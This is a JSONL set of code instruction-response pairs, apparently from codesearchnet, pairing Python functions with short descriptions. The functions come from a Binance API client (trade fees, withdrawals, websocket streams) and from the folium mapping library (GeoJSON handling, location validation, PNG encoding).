{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting log of small amounts exchanged for BNB.", "response": "def get_dust_log(self, **params):\n        \"\"\"Get log of small amounts exchanged for BNB.\n\n        https://github.com/binance-exchange/binance-official-api-docs/blob/master/wapi-api.md#dustlog-user_data\n\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        .. code-block:: python\n\n            {\n                \"success\": true,\n                \"results\": {\n                    \"total\": 2,   //Total counts of exchange\n                    \"rows\": [\n                        {\n                            \"transfered_total\": \"0.00132256\", # Total transfered BNB amount for this exchange.\n                            \"service_charge_total\": \"0.00002699\",   # Total service charge amount for this exchange.\n                            \"tran_id\": 4359321,\n                            \"logs\": [           # Details of  this exchange.\n                                {\n                                    \"tranId\": 4359321,\n                                    \"serviceChargeAmount\": \"0.000009\",\n                                    \"uid\": \"10000015\",\n                                    \"amount\": \"0.0009\",\n                                    \"operateTime\": \"2018-05-03 17:07:04\",\n                                    \"transferedAmount\": \"0.000441\",\n                                    \"fromAsset\": \"USDT\"\n                                },\n                                {\n                                    \"tranId\": 4359321,\n                                    \"serviceChargeAmount\": \"0.00001799\",\n                                    \"uid\": \"10000015\",\n                                    \"amount\": \"0.0009\",\n                                    \"operateTime\": \"2018-05-03 17:07:04\",\n                                    \"transferedAmount\": \"0.00088156\",\n                                    \"fromAsset\": \"ETH\"\n                                }\n                            ],\n                            \"operate_time\": \"2018-05-03 17:07:04\" //The time of this exchange.\n                        },\n                        {\n                            \"transfered_total\": \"0.00058795\",\n                            \"service_charge_total\": \"0.000012\",\n                            \"tran_id\": 4357015,\n                            \"logs\": [       // Details of  this exchange.\n                                {\n                                    \"tranId\": 4357015,\n                                    \"serviceChargeAmount\": \"0.00001\",\n                                    \"uid\": \"10000015\",\n                                    \"amount\": \"0.001\",\n                                    \"operateTime\": \"2018-05-02 13:52:24\",\n                                    \"transferedAmount\": \"0.00049\",\n                                    \"fromAsset\": \"USDT\"\n                                },\n                                {\n                                    \"tranId\": 4357015,\n                                    \"serviceChargeAmount\": \"0.000002\",\n                                    \"uid\": \"10000015\",\n                                    \"amount\": \"0.0001\",\n                                    \"operateTime\": \"2018-05-02 13:51:11\",\n                                    \"transferedAmount\": \"0.00009795\",\n                                    \"fromAsset\": \"ETH\"\n                                }\n                            ],\n                            \"operate_time\": \"2018-05-02 13:51:11\"\n                        }\n                    ]\n                }\n            }\n\n        :raises: BinanceWithdrawException\n\n        \"\"\"\n        res = self._request_withdraw_api('get', 'userAssetDribbletLog.html', True, data=params)\n        if not res['success']:\n            raise BinanceWithdrawException(res['msg'])\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting trade fee. https://github.com/binance-exchange/binance-official-api-docs/blob/master/wapi-api.md#trade-fee-user_data :param symbol: optional :type symbol: str :param recvWindow: the number of milliseconds the request is valid for :type recvWindow: int :returns: API response .. code-block:: python { \"tradeFee\": [ { \"symbol\": \"ADABNB\", \"maker\": 0.9000, \"taker\": 1.0000 }, { \"symbol\": \"BNBBTC\", \"maker\": 0.3000, \"taker\": 0.3000 } ], \"success\": true } :raises: BinanceWithdrawException", "response": "def get_trade_fee(self, **params):\n        \"\"\"Get trade fee.\n\n        https://github.com/binance-exchange/binance-official-api-docs/blob/master/wapi-api.md#trade-fee-user_data\n\n        :param symbol: optional\n        :type symbol: str\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        .. code-block:: python\n\n            {\n                \"tradeFee\": [\n                    {\n                        \"symbol\": \"ADABNB\",\n                        \"maker\": 0.9000,\n                        \"taker\": 1.0000\n                    }, {\n                        \"symbol\": \"BNBBTC\",\n                        \"maker\": 0.3000,\n                        \"taker\": 0.3000\n                    }\n                ],\n                \"success\": true\n            }\n\n        :raises: BinanceWithdrawException\n\n        \"\"\"\n        res = self._request_withdraw_api('get', 'tradeFee.html', True, data=params)\n        if not res['success']:\n            raise BinanceWithdrawException(res['msg'])\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nfetching details on assets.", "response": "def get_asset_details(self, **params):\n        \"\"\"Fetch details on assets.\n\n        https://github.com/binance-exchange/binance-official-api-docs/blob/master/wapi-api.md#asset-detail-user_data\n\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        .. code-block:: python\n\n            {\n                \"success\": true,\n                \"assetDetail\": {\n                    \"CTR\": {\n                        \"minWithdrawAmount\": \"70.00000000\", //min withdraw amount\n                        \"depositStatus\": false,//deposit status\n                        \"withdrawFee\": 35, // withdraw fee\n                        \"withdrawStatus\": true, //withdraw status\n                        \"depositTip\": \"Delisted, Deposit Suspended\" //reason\n                    },\n                    \"SKY\": {\n                        \"minWithdrawAmount\": \"0.02000000\",\n                        \"depositStatus\": true,\n                        \"withdrawFee\": 0.01,\n                        \"withdrawStatus\": true\n                    }\n                }\n            }\n\n        :raises: BinanceWithdrawException\n\n        \"\"\"\n        res = self._request_withdraw_api('get', 'assetDetail.html', True, data=params)\n        if not res['success']:\n            raise BinanceWithdrawException(res['msg'])\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsubmits a withdraw request.", "response": "def withdraw(self, **params):\n        \"\"\"Submit a withdraw request.\n\n        https://www.binance.com/restapipub.html\n\n        Assumptions:\n\n        - You must have Withdraw permissions enabled on your API key\n        - You must have withdrawn to the address specified through the website and approved the transaction via email\n\n        :param asset: required\n        :type asset: str\n        :type address: required\n        :type address: str\n        :type addressTag: optional - Secondary address identifier for coins like XRP,XMR etc.\n        :type address: str\n        :param amount: required\n        :type amount: decimal\n        :param name: optional - Description of the address, default asset value passed will be used\n        :type name: str\n        :param recvWindow: the number of milliseconds the request is valid for\n        :type recvWindow: int\n\n        :returns: API response\n\n        .. code-block:: python\n\n            {\n                \"msg\": \"success\",\n                \"success\": true,\n                \"id\":\"7213fea8e94b4a5593d507237e5a555b\"\n            }\n\n        :raises: BinanceRequestException, BinanceAPIException, BinanceWithdrawException\n\n        \"\"\"\n        # force a name for the withdrawal if one not set\n        if 'asset' in params and 'name' not in params:\n            params['name'] = params['asset']\n        res = self._request_withdraw_api('post', 'withdraw.html', True, data=params)\n        if not res['success']:\n            raise BinanceWithdrawException(res['msg'])\n        return res"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nping a user data stream to prevent a time out.", "response": "def stream_keepalive(self, listenKey):\n        \"\"\"PING a user data stream to prevent a time out.\n\n        https://github.com/binance-exchange/binance-official-api-docs/blob/master/rest-api.md#keepalive-user-data-stream-user_stream\n\n        :param listenKey: required\n        :type listenKey: str\n\n        :returns: API response\n\n        .. code-block:: python\n\n            {}\n\n        :raises: BinanceRequestException, BinanceAPIException\n\n        \"\"\"\n        params = {\n            'listenKey': listenKey\n        }\n        return self._put('userDataStream', False, data=params)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef stream_close(self, listenKey):\n        params = {\n            'listenKey': listenKey\n        }\n        return self._delete('userDataStream', False, data=params)", "response": "Close out a user data stream."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef start_depth_socket(self, symbol, callback, depth=None):\n        socket_name = symbol.lower() + '@depth'\n        if depth and depth != '1':\n            socket_name = '{}{}'.format(socket_name, depth)\n        return self._start_socket(socket_name, callback)", "response": "Start a websocket for the given symbol market depth"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef start_kline_socket(self, symbol, callback, interval=Client.KLINE_INTERVAL_1MINUTE):\n        socket_name = '{}@kline_{}'.format(symbol.lower(), interval)\n        return self._start_socket(socket_name, callback)", "response": "Start a websocket for a given symbol kline."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nstarting a multiplexed socket using a list of socket names.", "response": "def start_multiplex_socket(self, streams, callback):\n        \"\"\"Start a multiplexed socket using a list of socket names.\n        User stream sockets can not be included.\n\n        Symbols in socket name must be lowercase i.e bnbbtc@aggTrade, neobtc@ticker\n\n        Combined stream events are wrapped as follows: {\"stream\":\"<streamName>\",\"data\":<rawPayload>}\n\n        https://github.com/binance-exchange/binance-official-api-docs/blob/master/web-socket-streams.md\n\n        :param streams: list of stream names in lower case\n        :type streams: list\n        :param callback: callback function to handle messages\n        :type callback: function\n\n        :returns: connection key string if successful, False otherwise\n\n        Message Format - see Binance API docs for all types\n\n        \"\"\"\n        stream_path = 'streams={}'.format('/'.join(streams))\n        return self._start_socket(stream_path, callback, 'stream?')"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstarting a websocket for the user data", "response": "def start_user_socket(self, callback):\n        \"\"\"Start a websocket for user data\n\n        https://github.com/binance-exchange/binance-official-api-docs/blob/master/user-data-stream.md\n\n        :param callback: callback function to handle messages\n        :type callback: function\n\n        :returns: connection key string if successful, False otherwise\n\n        Message Format - see Binance API docs for all types\n        \"\"\"\n        # Get the user listen key\n        user_listen_key = self._client.stream_get_listen_key()\n        # and start the socket with this specific key\n        conn_key = self._start_user_socket(user_listen_key, callback)\n        return conn_key"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nstops a websocket given the connection key.", "response": "def stop_socket(self, conn_key):\n        \"\"\"Stop a websocket given the connection key\n\n        :param conn_key: Socket connection key\n        :type conn_key: string\n\n        :returns: connection key string if successful, False otherwise\n        \"\"\"\n        if conn_key not in self._conns:\n            return\n\n        # disable reconnecting if we are closing\n        self._conns[conn_key].factory = WebSocketClientFactory(self.STREAM_URL + 'tmp_path')\n        self._conns[conn_key].disconnect()\n        del(self._conns[conn_key])\n\n        # check if we have a user stream socket\n        if len(conn_key) >= 60 and conn_key[:60] == self._user_listen_key:\n            self._stop_user_socket()"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef close(self):\n        keys = set(self._conns.keys())\n        for key in keys:\n            self.stop_socket(key)\n\n        self._conns = {}", "response": "Close all connections and remove all associated resources"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncomputes the bounds of the object itself and its children.", "response": "def _get_self_bounds(self):\n        \"\"\"\n        Computes the bounds of the object itself (not including it's children)\n        in the form [[lat_min, lon_min], [lat_max, lon_max]].\n\n        \"\"\"\n        bounds = [[None, None], [None, None]]\n        for point in self.data:\n            bounds = [\n                [\n                    none_min(bounds[0][0], point[0]),\n                    none_min(bounds[0][1], point[1]),\n                ],\n                [\n                    none_max(bounds[1][0], point[0]),\n                    none_max(bounds[1][1], point[1]),\n                ],\n            ]\n        return bounds"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns a list of options and constants shared between vector overlays and path elements.", "response": "def path_options(line=False, radius=False, **kwargs):\n    \"\"\"\n    Contains options and constants shared between vector overlays\n    (Polygon, Polyline, Circle, CircleMarker, and Rectangle).\n\n    Parameters\n    ----------\n    stroke: Bool, True\n        Whether to draw stroke along the path.\n        Set it to false to disable borders on polygons or circles.\n    color: str, '#3388ff'\n        Stroke color.\n    weight: int, 3\n        Stroke width in pixels.\n    opacity: float, 1.0\n        Stroke opacity.\n    line_cap: str, 'round' (lineCap)\n        A string that defines shape to be used at the end of the stroke.\n        https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/stroke-linecap\n    line_join: str, 'round' (lineJoin)\n        A string that defines shape to be used at the corners of the stroke.\n        https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/stroke-linejoin\n    dash_array: str, None (dashArray)\n        A string that defines the stroke dash pattern.\n        Doesn't work on Canvas-powered layers in some old browsers.\n        https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/stroke-dasharray\n    dash_offset:, str, None (dashOffset)\n        A string that defines the distance into the dash pattern to start the dash.\n        Doesn't work on Canvas-powered layers in some old browsers.\n        https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/stroke-dashoffset\n    fill: Bool, False\n        Whether to fill the path with color.\n        Set it to false to disable filling on polygons or circles.\n    fill_color: str, default to `color` (fillColor)\n        Fill color. Defaults to the value of the color option.\n    fill_opacity: float, 0.2 (fillOpacity)\n        Fill opacity.\n    fill_rule: str, 'evenodd' (fillRule)\n        A string that defines how the inside of a shape is determined.\n        https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/fill-rule\n    bubbling_mouse_events: Bool, True (bubblingMouseEvents)\n        When true a mouse event on this path will trigger the same event on the\n        map (unless L.DomEvent.stopPropagation is used).\n\n    Note that the presence of `fill_color` will override `fill=False`.\n\n    See https://leafletjs.com/reference-1.4.0.html#path\n\n    \"\"\"\n\n    extra_options = {}\n    if line:\n        extra_options = {\n            'smoothFactor': kwargs.pop('smooth_factor', 1.0),\n            'noClip': kwargs.pop('no_clip', False),\n        }\n    if radius:\n        extra_options.update({'radius': radius})\n\n    color = kwargs.pop('color', '#3388ff')\n    fill_color = kwargs.pop('fill_color', False)\n    if fill_color:\n        fill = True\n    elif not fill_color:\n        fill_color = color\n        fill = kwargs.pop('fill', False)\n\n    default = {\n        'stroke': kwargs.pop('stroke', True),\n        'color': color,\n        'weight': kwargs.pop('weight', 3),\n        'opacity': kwargs.pop('opacity', 1.0),\n        'lineCap': kwargs.pop('line_cap', 'round'),\n        'lineJoin': kwargs.pop('line_join', 'round'),\n        'dashArray': kwargs.pop('dash_array', None),\n        'dashOffset': kwargs.pop('dash_offset', None),\n        'fill': fill,\n        'fillColor': fill_color,\n        'fillOpacity': kwargs.pop('fill_opacity', 0.2),\n        'fillRule': kwargs.pop('fill_rule', 'evenodd'),\n        'bubblingMouseEvents': kwargs.pop('bubbling_mouse_events', True),\n    }\n    default.update(extra_options)\n    return default"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nrenders the HTML representation of the element.", "response": "def render(self, **kwargs):\n        \"\"\"Renders the HTML representation of the element.\"\"\"\n        self.json = json.dumps(self.data)\n\n        self._parent.html.add_child(Element(Template(\"\"\"\n            <div id=\"{{this.get_name()}}\"></div>\n            \"\"\").render(this=self, kwargs=kwargs)), name=self.get_name())\n\n        self._parent.script.add_child(Element(Template(\"\"\"\n            vega_parse({{this.json}},{{this.get_name()}});\n            \"\"\").render(this=self)), name=self.get_name())\n\n        figure = self.get_root()\n        assert isinstance(figure, Figure), ('You cannot render this Element '\n                                            'if it is not in a Figure.')\n\n        figure.header.add_child(Element(Template(\"\"\"\n            <style> #{{this.get_name()}} {\n                position : {{this.position}};\n                width : {{this.width[0]}}{{this.width[1]}};\n                height: {{this.height[0]}}{{this.height[1]}};\n                left: {{this.left[0]}}{{this.left[1]}};\n                top: {{this.top[0]}}{{this.top[1]}};\n            </style>\n            \"\"\").render(this=self, **kwargs)), name=self.get_name())\n\n        figure.header.add_child(\n            JavascriptLink('https://cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js'),  # noqa\n            name='d3')\n\n        figure.header.add_child(\n            JavascriptLink('https://cdnjs.cloudflare.com/ajax/libs/vega/1.4.3/vega.min.js'),  # noqa\n            name='vega')\n\n        figure.header.add_child(\n            JavascriptLink('https://code.jquery.com/jquery-2.1.0.min.js'),\n            name='jquery')\n\n        figure.script.add_child(\n            Template(\"\"\"function vega_parse(spec, div) {\n            vg.parse.spec(spec, function(chart) { chart({el:div}).update(); });}\"\"\"),  # noqa\n            name='vega_parse')"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nrender the HTML representation of the element.", "response": "def render(self, **kwargs):\n        \"\"\"Renders the HTML representation of the element.\"\"\"\n        vegalite_major_version = self._get_vegalite_major_versions(self.data)\n\n        self._parent.html.add_child(Element(Template(\"\"\"\n            <div id=\"{{this.get_name()}}\"></div>\n            \"\"\").render(this=self, kwargs=kwargs)), name=self.get_name())\n\n        figure = self.get_root()\n        assert isinstance(figure, Figure), ('You cannot render this Element '\n                                            'if it is not in a Figure.')\n\n        figure.header.add_child(Element(Template(\"\"\"\n            <style> #{{this.get_name()}} {\n                position : {{this.position}};\n                width : {{this.width[0]}}{{this.width[1]}};\n                height: {{this.height[0]}}{{this.height[1]}};\n                left: {{this.left[0]}}{{this.left[1]}};\n                top: {{this.top[0]}}{{this.top[1]}};\n            </style>\n            \"\"\").render(this=self, **kwargs)), name=self.get_name())\n\n        if vegalite_major_version == '1':\n            self._embed_vegalite_v1(figure)\n        elif vegalite_major_version == '2':\n            self._embed_vegalite_v2(figure)\n        elif vegalite_major_version == '3':\n            self._embed_vegalite_v3(figure)\n        else:\n            # Version 2 is assumed as the default, if no version is given in the schema.\n            self._embed_vegalite_v2(figure)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef process_data(self, data):\n        if isinstance(data, dict):\n            self.embed = True\n            return data\n        elif isinstance(data, str):\n            if data.lower().startswith(('http:', 'ftp:', 'https:')):\n                if not self.embed:\n                    self.embed_link = data\n                return requests.get(data).json()\n            elif data.lstrip()[0] in '[{':  # This is a GeoJSON inline string\n                self.embed = True\n                return json.loads(data)\n            else:  # This is a filename\n                if not self.embed:\n                    self.embed_link = data\n                with open(data) as f:\n                    return json.loads(f.read())\n        elif hasattr(data, '__geo_interface__'):\n            self.embed = True\n            if hasattr(data, 'to_crs'):\n                data = data.to_crs(epsg='4326')\n            return json.loads(json.dumps(data.__geo_interface__))\n        else:\n            raise ValueError('Cannot render objects with any missing geometries'\n                             ': {!r}'.format(data))", "response": "Convert an unknown data input into a geojson dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nconverting data into a FeatureCollection if it is not already.", "response": "def convert_to_feature_collection(self):\n        \"\"\"Convert data into a FeatureCollection if it is not already.\"\"\"\n        if self.data['type'] == 'FeatureCollection':\n            return\n        if not self.embed:\n            raise ValueError(\n                'Data is not a FeatureCollection, but it should be to apply '\n                'style or highlight. Because `embed=False` it cannot be '\n                'converted into one.\\nEither change your geojson data to a '\n                'FeatureCollection, set `embed=True` or disable styling.')\n        # Catch case when GeoJSON is just a single Feature or a geometry.\n        if 'geometry' not in self.data.keys():\n            # Catch case when GeoJSON is just a geometry.\n            self.data = {'type': 'Feature', 'geometry': self.data}\n        self.data = {'type': 'FeatureCollection', 'features': [self.data]}"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nvalidate that a function returns a dictionary.", "response": "def _validate_function(self, func, name):\n        \"\"\"\n        Tests `self.style_function` and `self.highlight_function` to ensure\n        they are functions returning dictionaries.\n        \"\"\"\n        test_feature = self.data['features'][0]\n        if not callable(func) or not isinstance(func(test_feature), dict):\n            raise ValueError('{} should be a function that accepts items from '\n                             'data[\\'features\\'] and returns a dictionary.'\n                             .format(name))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef find_identifier(self):\n        features = self.data['features']\n        n = len(features)\n        feature = features[0]\n        if 'id' in feature and len(set(feat['id'] for feat in features)) == n:\n            return 'feature.id'\n        for key in feature.get('properties', []):\n            if len(set(feat['properties'][key] for feat in features)) == n:\n                return 'feature.properties.{}'.format(key)\n        if self.embed:\n            for i, feature in enumerate(self.data['features']):\n                feature['id'] = str(i)\n            return 'feature.id'\n        raise ValueError(\n            'There is no unique identifier for each feature and because '\n            '`embed=False` it cannot be added. Consider adding an `id` '\n            'field to your geojson data or set `embed=True`. '\n        )", "response": "Find a unique identifier for each feature create it if needed."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_feature_id(self, feature):\n        fields = self.feature_identifier.split('.')[1:]\n        return functools.reduce(operator.getitem, fields, feature)", "response": "Return a value identifying the feature."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconvert dict to str and enable Jinja2 template syntax.", "response": "def _to_key(d):\n        \"\"\"Convert dict to str and enable Jinja2 template syntax.\"\"\"\n        as_str = json.dumps(d, sort_keys=True)\n        return as_str.replace('\"{{', '{{').replace('}}\"', '}}')"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreplaces the field with the most features with a default field.", "response": "def _set_default_key(mapping):\n        \"\"\"Replace the field with the most features with a 'default' field.\"\"\"\n        key_longest = sorted([(len(v), k) for k, v in mapping.items()],\n                             reverse=True)[0][1]\n        mapping['default'] = key_longest\n        del (mapping[key_longest])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef style_data(self):\n\n        def recursive_get(data, keys):\n            if len(keys):\n                return recursive_get(data.get(keys[0]), keys[1:])\n            else:\n                return data\n\n        geometries = recursive_get(self.data, self.object_path.split('.'))['geometries']  # noqa\n        for feature in geometries:\n            feature.setdefault('properties', {}).setdefault('style', {}).update(self.style_function(feature))", "response": "Applies self. style_function to each feature of self. data."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_bounds(self):\n        if not self.embed:\n            raise ValueError('Cannot compute bounds of non-embedded TopoJSON.')\n\n        xmin, xmax, ymin, ymax = None, None, None, None\n\n        for arc in self.data['arcs']:\n            x, y = 0, 0\n            for dx, dy in arc:\n                x += dx\n                y += dy\n                xmin = none_min(x, xmin)\n                xmax = none_max(x, xmax)\n                ymin = none_min(y, ymin)\n                ymax = none_max(y, ymax)\n        return [\n            [\n                self.data['transform']['translate'][1] + self.data['transform']['scale'][1] * ymin,  # noqa\n                self.data['transform']['translate'][0] + self.data['transform']['scale'][0] * xmin  # noqa\n            ],\n            [\n                self.data['transform']['translate'][1] + self.data['transform']['scale'][1] * ymax,  # noqa\n                self.data['transform']['translate'][0] + self.data['transform']['scale'][0] * xmax  # noqa\n            ]\n        ]", "response": "Computes the bounds of the object."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef warn_for_geometry_collections(self):\n        geom_collections = [\n            feature.get('properties') if feature.get('properties') is not None else key\n            for key, feature in enumerate(self._parent.data['features'])\n            if feature['geometry']['type'] == 'GeometryCollection'\n        ]\n        if any(geom_collections):\n            warnings.warn(\n                \"GeoJsonTooltip is not configured to render tooltips for GeoJson GeometryCollection geometries. \"\n                \"Please consider reworking these features: {} to MultiPolygon for full functionality.\\n\"\n                \"https://tools.ietf.org/html/rfc7946#page-9\".format(geom_collections), UserWarning)", "response": "Checks for GeoJson GeometryCollection features to warn user about incompatibility."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nrender the HTML representation of the element.", "response": "def render(self, **kwargs):\n        \"\"\"Renders the HTML representation of the element.\"\"\"\n        if isinstance(self._parent, GeoJson):\n            keys = tuple(self._parent.data['features'][0]['properties'].keys())\n            self.warn_for_geometry_collections()\n        elif isinstance(self._parent, TopoJson):\n            obj_name = self._parent.object_path.split('.')[-1]\n            keys = tuple(self._parent.data['objects'][obj_name][\n                             'geometries'][0]['properties'].keys())\n        else:\n            raise TypeError('You cannot add a GeoJsonTooltip to anything else '\n                            'than a GeoJson or TopoJson object.')\n        keys = tuple(x for x in keys if x not in ('style', 'highlight'))\n        for value in self.fields:\n            assert value in keys, ('The field {} is not available in the data. '\n                                   'Choose from: {}.'.format(value, keys))\n        super(GeoJsonTooltip, self).render(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nrendering the GeoJson / TopoJson and color scale objects.", "response": "def render(self, **kwargs):\n        \"\"\"Render the GeoJson/TopoJson and color scale objects.\"\"\"\n        if self.color_scale:\n            # ColorMap needs Map as its parent\n            assert isinstance(self._parent, Map), ('Choropleth must be added'\n                                                   ' to a Map object.')\n            self.color_scale._parent = self._parent\n\n        super(Choropleth, self).render(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef validate_location(location):  # noqa: C901\n    if isinstance(location, np.ndarray) \\\n            or (pd is not None and isinstance(location, pd.DataFrame)):\n        location = np.squeeze(location).tolist()\n    if not hasattr(location, '__len__'):\n        raise TypeError('Location should be a sized variable, '\n                        'for example a list or a tuple, instead got '\n                        '{!r} of type {}.'.format(location, type(location)))\n    if len(location) != 2:\n        raise ValueError('Expected two (lat, lon) values for location, '\n                         'instead got: {!r}.'.format(location))\n    try:\n        coords = (location[0], location[1])\n    except (TypeError, KeyError):\n        raise TypeError('Location should support indexing, like a list or '\n                        'a tuple does, instead got {!r} of type {}.'\n                        .format(location, type(location)))\n    for coord in coords:\n        try:\n            float(coord)\n        except (TypeError, ValueError):\n            raise ValueError('Location should consist of two numerical values, '\n                             'but {!r} of type {} is not convertible to float.'\n                             .format(coord, type(coord)))\n        if math.isnan(float(coord)):\n            raise ValueError('Location values cannot contain NaNs.')\n    return [float(x) for x in coords]", "response": "Validate that a single lat / lon coordinate pair and convert to a list of two - dimensional arrays."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef validate_locations(locations):\n    locations = if_pandas_df_convert_to_numpy(locations)\n    try:\n        iter(locations)\n    except TypeError:\n        raise TypeError('Locations should be an iterable with coordinate pairs,'\n                        ' but instead got {!r}.'.format(locations))\n    try:\n        next(iter(locations))\n    except StopIteration:\n        raise ValueError('Locations is empty.')\n    try:\n        float(next(iter(next(iter(next(iter(locations)))))))\n    except (TypeError, StopIteration):\n        # locations is a list of coordinate pairs\n        return [validate_location(coord_pair) for coord_pair in locations]\n    else:\n        # locations is a list of a list of coordinate pairs, recurse\n        return [validate_locations(lst) for lst in locations]", "response": "Validate an iterable with multiple lat / lon coordinate pairs."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconverts a Pandas dataframe to Numpy array.", "response": "def if_pandas_df_convert_to_numpy(obj):\n    \"\"\"Return a Numpy array from a Pandas dataframe.\n\n    Iterating over a DataFrame has weird side effects, such as the first\n    row being the column names. Converting to Numpy is more safe.\n    \"\"\"\n    if pd is not None and isinstance(obj, pd.DataFrame):\n        return obj.values\n    else:\n        return obj"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef image_to_url(image, colormap=None, origin='upper'):\n    if isinstance(image, str) and not _is_url(image):\n        fileformat = os.path.splitext(image)[-1][1:]\n        with io.open(image, 'rb') as f:\n            img = f.read()\n        b64encoded = base64.b64encode(img).decode('utf-8')\n        url = 'data:image/{};base64,{}'.format(fileformat, b64encoded)\n    elif 'ndarray' in image.__class__.__name__:\n        img = write_png(image, origin=origin, colormap=colormap)\n        b64encoded = base64.b64encode(img).decode('utf-8')\n        url = 'data:image/png;base64,{}'.format(b64encoded)\n    else:\n        # Round-trip to ensure a nice formatted json.\n        url = json.loads(json.dumps(image))\n    return url.replace('\\n', ' ')", "response": "Takes a string file or array - like object and transforms it into a URL."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ntransforming an array of data into a PNG string.", "response": "def write_png(data, origin='upper', colormap=None):\n    \"\"\"\n    Transform an array of data into a PNG string.\n    This can be written to disk using binary I/O, or encoded using base64\n    for an inline PNG like this:\n\n    >>> png_str = write_png(array)\n    >>> \"data:image/png;base64,\"+png_str.encode('base64')\n\n    Inspired from\n    https://stackoverflow.com/questions/902761/saving-a-numpy-array-as-an-image\n\n    Parameters\n    ----------\n    data: numpy array or equivalent list-like object.\n         Must be NxM (mono), NxMx3 (RGB) or NxMx4 (RGBA)\n\n    origin : ['upper' | 'lower'], optional, default 'upper'\n        Place the [0,0] index of the array in the upper left or lower left\n        corner of the axes.\n\n    colormap : callable, used only for `mono` image.\n        Function of the form [x -> (r,g,b)] or [x -> (r,g,b,a)]\n        for transforming a mono image into RGB.\n        It must output iterables of length 3 or 4, with values between\n        0. and 1.  Hint: you can use colormaps from `matplotlib.cm`.\n\n    Returns\n    -------\n    PNG formatted byte string\n\n    \"\"\"\n    if colormap is None:\n        def colormap(x):\n            return (x, x, x, 1)\n\n    arr = np.atleast_3d(data)\n    height, width, nblayers = arr.shape\n\n    if nblayers not in [1, 3, 4]:\n        raise ValueError('Data must be NxM (mono), '\n                         'NxMx3 (RGB), or NxMx4 (RGBA)')\n    assert arr.shape == (height, width, nblayers)\n\n    if nblayers == 1:\n        arr = np.array(list(map(colormap, arr.ravel())))\n        nblayers = arr.shape[1]\n        if nblayers not in [3, 4]:\n            raise ValueError('colormap must provide colors of r'\n                             'length 3 (RGB) or 4 (RGBA)')\n        arr = arr.reshape((height, width, nblayers))\n    assert arr.shape == (height, width, nblayers)\n\n    if nblayers == 3:\n        arr = np.concatenate((arr, np.ones((height, width, 1))), axis=2)\n        nblayers = 4\n    assert arr.shape == (height, width, nblayers)\n    assert nblayers == 4\n\n    # Normalize to uint8 if it isn't already.\n    if arr.dtype != 'uint8':\n        with np.errstate(divide='ignore', invalid='ignore'):\n            arr = arr * 255./arr.max(axis=(0, 1)).reshape((1, 1, 4))\n            arr[~np.isfinite(arr)] = 0\n        arr = arr.astype('uint8')\n\n    # Eventually flip the image.\n    if origin == 'lower':\n        arr = arr[::-1, :, :]\n\n    # Transform the array to bytes.\n    raw_data = b''.join([b'\\x00' + arr[i, :, :].tobytes()\n                         for i in range(height)])\n\n    def png_pack(png_tag, data):\n        chunk_head = png_tag + data\n        return (struct.pack('!I', len(data)) +\n                chunk_head +\n                struct.pack('!I', 0xFFFFFFFF & zlib.crc32(chunk_head)))\n\n    return b''.join([\n        b'\\x89PNG\\r\\n\\x1a\\n',\n        png_pack(b'IHDR', struct.pack('!2I5B', width, height, 8, 6, 0, 0, 0)),\n        png_pack(b'IDAT', zlib.compress(raw_data, 9)),\n        png_pack(b'IEND', b'')])"}
